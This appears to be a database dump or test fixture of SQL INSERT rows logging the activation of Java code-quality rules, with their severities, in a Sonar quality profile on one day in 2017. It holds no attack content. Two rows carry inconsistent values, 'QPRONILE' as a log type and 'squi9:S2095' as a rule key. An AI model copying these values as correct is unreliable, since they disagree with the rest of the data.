INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (182, '2017-11-16 07:37:02.915', NULL, 'key=java-sonar-way-87983:squid:S1220;ruleKey=squid:S1220;profileKey=java-sonar-way-87983;severity=MINOR', 'QPRONILE', 'ACTIVATED', NULL, 'AV_DwnjCbbGRdfPp-qfk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (183, '2017-11-16 07:37:02.922', NULL, 'key=java-sonar-way-87983:squid:S1221;ruleKey=squid:S1221;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjKbbGRdfPp-qfl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (184, '2017-11-16 07:37:02.926', NULL, 'key=java-sonar-way-87983:squid:S1223;ruleKey=squid:S1223;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjObbGRdfPp-qfm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (185, '2017-11-16 07:37:02.93', NULL, 'key=java-sonar-way-87983:squid:S1226;ruleKey=squid:S1226;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjSbbGRdfPp-qfn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (186, '2017-11-16 07:37:02.934', NULL, 'key=java-sonar-way-87983:squid:S1264;ruleKey=squid:S1264;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjWbbGRdfPp-qfo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (187, '2017-11-16 07:37:02.938', NULL, 'key=java-sonar-way-87983:squid:S1301;ruleKey=squid:S1301;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjabbGRdfPp-qfp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (188, '2017-11-16 07:37:02.953', NULL, 'key=java-sonar-way-87983:squid:S1313;ruleKey=squid:S1313;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjpbbGRdfPp-qfq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (189, '2017-11-16 07:37:02.957', NULL, 'key=java-sonar-way-87983:squid:S1317;ruleKey=squid:S1317;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjtbbGRdfPp-qfr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (190, '2017-11-16 07:37:02.961', NULL, 'key=java-sonar-way-87983:squid:S1319;ruleKey=squid:S1319;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnjxbbGRdfPp-qfs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (191, '2017-11-16 07:37:02.967', NULL, 'key=java-sonar-way-87983:squid:S1444;ruleKey=squid:S1444;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnj3bbGRdfPp-qft');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (192, '2017-11-16 07:37:02.971', NULL, 'key=java-sonar-way-87983:squid:S1450;ruleKey=squid:S1450;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnj6bbGRdfPp-qfu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (193, '2017-11-16 07:37:02.982', NULL, 'key=java-sonar-way-87983:squid:S1452;ruleKey=squid:S1452;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkGbbGRdfPp-qfv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (194, '2017-11-16 07:37:02.986', NULL, 'key=java-sonar-way-87983:squid:S1479;ruleKey=squid:S1479;profileKey=java-sonar-way-87983;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkKbbGRdfPp-qfw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (195, '2017-11-16 07:37:02.99', NULL, 'key=java-sonar-way-87983:squid:S1481;ruleKey=squid:S1481;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkObbGRdfPp-qfx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (196, '2017-11-16 07:37:02.994', NULL, 'key=java-sonar-way-87983:squid:S1488;ruleKey=squid:S1488;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkSbbGRdfPp-qfy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (197, '2017-11-16 07:37:02.998', NULL, 'key=java-sonar-way-87983:squid:S1596;ruleKey=squid:S1596;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkWbbGRdfPp-qfz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (198, '2017-11-16 07:37:03.002', NULL, 'key=java-sonar-way-87983:squid:S1598;ruleKey=squid:S1598;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkZbbGRdfPp-qf0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (199, '2017-11-16 07:37:03.005', NULL, 'key=java-sonar-way-87983:squid:S1602;ruleKey=squid:S1602;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkdbbGRdfPp-qf1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (200, '2017-11-16 07:37:03.01', NULL, 'key=java-sonar-way-87983:squid:S1604;ruleKey=squid:S1604;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkibbGRdfPp-qf2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (201, '2017-11-16 07:37:03.019', NULL, 'key=java-sonar-way-87983:squid:S1607;ruleKey=squid:S1607;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkrbbGRdfPp-qf3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (202, '2017-11-16 07:37:03.026', NULL, 'key=java-sonar-way-87983:squid:S1610;ruleKey=squid:S1610;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnkybbGRdfPp-qf4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (203, '2017-11-16 07:37:03.03', NULL, 'key=java-sonar-way-87983:squid:S1611;ruleKey=squid:S1611;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnk2bbGRdfPp-qf5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (204, '2017-11-16 07:37:03.034', NULL, 'key=java-sonar-way-87983:squid:S1612;ruleKey=squid:S1612;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnk6bbGRdfPp-qf6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (205, '2017-11-16 07:37:03.038', NULL, 'key=java-sonar-way-87983:squid:S1640;ruleKey=squid:S1640;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnk-bbGRdfPp-qf7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (206, '2017-11-16 07:37:03.042', NULL, 'key=java-sonar-way-87983:squid:S1643;ruleKey=squid:S1643;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlCbbGRdfPp-qf8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (207, '2017-11-16 07:37:03.046', NULL, 'key=java-sonar-way-87983:squid:S1656;ruleKey=squid:S1656;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlGbbGRdfPp-qf9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (208, '2017-11-16 07:37:03.05', NULL, 'key=java-sonar-way-87983:squid:S1659;ruleKey=squid:S1659;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlKbbGRdfPp-qf-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (209, '2017-11-16 07:37:03.054', NULL, 'key=java-sonar-way-87983:squid:S1700;ruleKey=squid:S1700;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlObbGRdfPp-qf_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (210, '2017-11-16 07:37:03.058', NULL, 'key=java-sonar-way-87983:squid:S1710;ruleKey=squid:S1710;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlSbbGRdfPp-qgA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (211, '2017-11-16 07:37:03.062', NULL, 'key=java-sonar-way-87983:squid:S1751;ruleKey=squid:S1751;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlWbbGRdfPp-qgB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (212, '2017-11-16 07:37:03.066', NULL, 'key=java-sonar-way-87983:squid:S1764;ruleKey=squid:S1764;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlabbGRdfPp-qgC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (213, '2017-11-16 07:37:03.078', NULL, 'key=java-sonar-way-87983:squid:S1844;ruleKey=squid:S1844;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlmbbGRdfPp-qgD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (214, '2017-11-16 07:37:03.082', NULL, 'key=java-sonar-way-87983:squid:S1845;ruleKey=squid:S1845;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlqbbGRdfPp-qgE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (215, '2017-11-16 07:37:03.086', NULL, 'key=java-sonar-way-87983:squid:S1849;ruleKey=squid:S1849;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlubbGRdfPp-qgF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (216, '2017-11-16 07:37:03.09', NULL, 'key=java-sonar-way-87983:squid:S1854;ruleKey=squid:S1854;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnlybbGRdfPp-qgG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (217, '2017-11-16 07:37:03.098', NULL, 'key=java-sonar-way-87983:squid:S1858;ruleKey=squid:S1858;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnl6bbGRdfPp-qgH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (218, '2017-11-16 07:37:03.102', NULL, 'key=java-sonar-way-87983:squid:S1860;ruleKey=squid:S1860;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnl-bbGRdfPp-qgI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (219, '2017-11-16 07:37:03.106', NULL, 'key=java-sonar-way-87983:squid:S1862;ruleKey=squid:S1862;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmCbbGRdfPp-qgJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (220, '2017-11-16 07:37:03.11', NULL, 'key=java-sonar-way-87983:squid:S1871;ruleKey=squid:S1871;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmGbbGRdfPp-qgK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (221, '2017-11-16 07:37:03.114', NULL, 'key=java-sonar-way-87983:squid:S1872;ruleKey=squid:S1872;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmJbbGRdfPp-qgL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (222, '2017-11-16 07:37:03.117', NULL, 'key=java-sonar-way-87983:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmNbbGRdfPp-qgM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (223, '2017-11-16 07:37:03.121', NULL, 'key=java-sonar-way-87983:squid:S1905;ruleKey=squid:S1905;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmRbbGRdfPp-qgN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (224, '2017-11-16 07:37:03.125', NULL, 'key=java-sonar-way-87983:squid:S1940;ruleKey=squid:S1940;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmVbbGRdfPp-qgO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (225, '2017-11-16 07:37:03.129', NULL, 'key=java-sonar-way-87983:squid:S1948;ruleKey=squid:S1948;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmZbbGRdfPp-qgP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (226, '2017-11-16 07:37:03.132', NULL, 'key=java-sonar-way-87983:squid:S1989;ruleKey=squid:S1989;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmcbbGRdfPp-qgQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (227, '2017-11-16 07:37:03.136', NULL, 'key=java-sonar-way-87983:squid:S1994;ruleKey=squid:S1994;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmgbbGRdfPp-qgR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (228, '2017-11-16 07:37:03.142', NULL, 'key=java-sonar-way-87983:squid:S2055;ruleKey=squid:S2055;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmmbbGRdfPp-qgS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (229, '2017-11-16 07:37:03.146', NULL, 'key=java-sonar-way-87983:squid:S2060;ruleKey=squid:S2060;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmqbbGRdfPp-qgT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (230, '2017-11-16 07:37:03.149', NULL, 'key=java-sonar-way-87983:squid:S2061;ruleKey=squid:S2061;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnmtbbGRdfPp-qgU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (231, '2017-11-16 07:37:03.157', NULL, 'key=java-sonar-way-87983:squid:S2062;ruleKey=squid:S2062;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnm1bbGRdfPp-qgV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (232, '2017-11-16 07:37:03.161', NULL, 'key=java-sonar-way-87983:squid:S2065;ruleKey=squid:S2065;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnm5bbGRdfPp-qgW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (233, '2017-11-16 07:37:03.165', NULL, 'key=java-sonar-way-87983:squid:S2066;ruleKey=squid:S2066;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnm9bbGRdfPp-qgX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (234, '2017-11-16 07:37:03.171', NULL, 'key=java-sonar-way-87983:squid:S2068;ruleKey=squid:S2068;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnDbbGRdfPp-qgY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (235, '2017-11-16 07:37:03.174', NULL, 'key=java-sonar-way-87983:squid:S2077;ruleKey=squid:S2077;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnGbbGRdfPp-qgZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (236, '2017-11-16 07:37:03.18', NULL, 'key=java-sonar-way-87983:squid:S2092;ruleKey=squid:S2092;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnMbbGRdfPp-qga');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (237, '2017-11-16 07:37:03.186', NULL, 'key=java-sonar-way-87983:squid:S2093;ruleKey=squid:S2093;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnSbbGRdfPp-qgb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (238, '2017-11-16 07:37:03.19', NULL, 'key=java-sonar-way-87983:squid:S2094;ruleKey=squid:S2094;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnWbbGRdfPp-qgc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (239, '2017-11-16 07:37:03.195', NULL, 'key=java-sonar-way-87983:squid:S2095;ruleKey=squi9:S2095;profileKey=java-sonar-way-87983;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnbbbGRdfPp-qgd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (240, '2017-11-16 07:37:03.199', NULL, 'key=java-sonar-way-87983:squid:S2097;ruleKey=squid:S2097;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnfbbGRdfPp-qge');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (241, '2017-11-16 07:37:03.204', NULL, 'key=java-sonar-way-87983:squid:S2109;ruleKey=squid:S2109;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnkbbGRdfPp-qgf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (242, '2017-11-16 07:37:03.208', NULL, 'key=java-sonar-way-87983:squid:S2110;ruleKey=squid:S2110;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnnbbGRdfPp-qgg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (243, '2017-11-16 07:37:03.211', NULL, 'key=java-sonar-way-87983:squid:S2111;ruleKey=squid:S2111;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnrbbGRdfPp-qgh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (244, '2017-11-16 07:37:03.215', NULL, 'key=java-sonar-way-87983:squid:S2112;ruleKey=squid:S2112;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnvbbGRdfPp-qgi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (245, '2017-11-16 07:37:03.219', NULL, 'key=java-sonar-way-87983:squid:S2114;ruleKey=squid:S2114;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnnzbbGRdfPp-qgj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (246, '2017-11-16 07:37:03.232', NULL, 'key=java-sonar-way-87983:squid:S2116;ruleKey=squid:S2116;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnn_bbGRdfPp-qgk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (247, '2017-11-16 07:37:03.236', NULL, 'key=java-sonar-way-87983:squid:S2118;ruleKey=squid:S2118;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoDbbGRdfPp-qgl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (248, '2017-11-16 07:37:03.239', NULL, 'key=java-sonar-way-87983:squid:S2122;ruleKey=squid:S2122;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoHbbGRdfPp-qgm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (249, '2017-11-16 07:37:03.243', NULL, 'key=java-sonar-way-87983:squid:S2123;ruleKey=squid:S2123;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoLbbGRdfPp-qgn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (250, '2017-11-16 07:37:03.247', NULL, 'key=java-sonar-way-87983:squid:S2127;ruleKey=squid:S2127;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoPbbGRdfPp-qgo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (251, '2017-11-16 07:37:03.253', NULL, 'key=java-sonar-way-87983:squid:S2129;ruleKey=squid:S2129;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoVbbGRdfPp-qgp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (252, '2017-11-16 07:37:03.258', NULL, 'key=java-sonar-way-87983:squid:S2130;ruleKey=squid:S2130;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnoZbbGRdfPp-qgq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (253, '2017-11-16 07:37:03.315', NULL, 'key=java-sonar-way-87983:squid:S2131;ruleKey=squid:S2131;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpTbbGRdfPp-qgr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (254, '2017-11-16 07:37:03.319', NULL, 'key=java-sonar-way-87983:squid:S2133;ruleKey=squid:S2133;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpXbbGRdfPp-qgs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (255, '2017-11-16 07:37:03.328', NULL, 'key=java-sonar-way-87983:squid:S2134;ruleKey=squid:S2134;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpgbbGRdfPp-qgt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (256, '2017-11-16 07:37:03.334', NULL, 'key=java-sonar-way-87983:squid:S2140;ruleKey=squid:S2140;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpmbbGRdfPp-qgu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (257, '2017-11-16 07:37:03.343', NULL, 'key=java-sonar-way-87983:squid:S2142;ruleKey=squid:S2142;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpvbbGRdfPp-qgv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (258, '2017-11-16 07:37:03.347', NULL, 'key=java-sonar-way-87983:squid:S2147;ruleKey=squid:S2147;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnpzbbGRdfPp-qgw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (259, '2017-11-16 07:37:03.351', NULL, 'key=java-sonar-way-87983:squid:S2151;ruleKey=squid:S2151;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnp3bbGRdfPp-qgx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (260, '2017-11-16 07:37:03.355', NULL, 'key=java-sonar-way-87983:squid:S2153;ruleKey=squid:S2153;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnp7bbGRdfPp-qgy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (261, '2017-11-16 07:37:03.359', NULL, 'key=java-sonar-way-87983:squid:S2154;ruleKey=squid:S2154;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnp_bbGRdfPp-qgz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (262, '2017-11-16 07:37:03.363', NULL, 'key=java-sonar-way-87983:squid:S2157;ruleKey=squid:S2157;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqDbbGRdfPp-qg0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (263, '2017-11-16 07:37:03.375', NULL, 'key=java-sonar-way-87983:squid:S2159;ruleKey=squid:S2159;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqPbbGRdfPp-qg1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (264, '2017-11-16 07:37:03.38', NULL, 'key=java-sonar-way-87983:squid:S2160;ruleKey=squid:S2160;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqUbbGRdfPp-qg2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (265, '2017-11-16 07:37:03.383', NULL, 'key=java-sonar-way-87983:squid:S2165;ruleKey=squid:S2165;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqXbbGRdfPp-qg3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (266, '2017-11-16 07:37:03.389', NULL, 'key=java-sonar-way-87983:squid:S2166;ruleKey=squid:S2166;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqdbbGRdfPp-qg4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (267, '2017-11-16 07:37:03.392', NULL, 'key=java-sonar-way-87983:squid:S2167;ruleKey=squid:S2167;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqgbbGRdfPp-qg5');
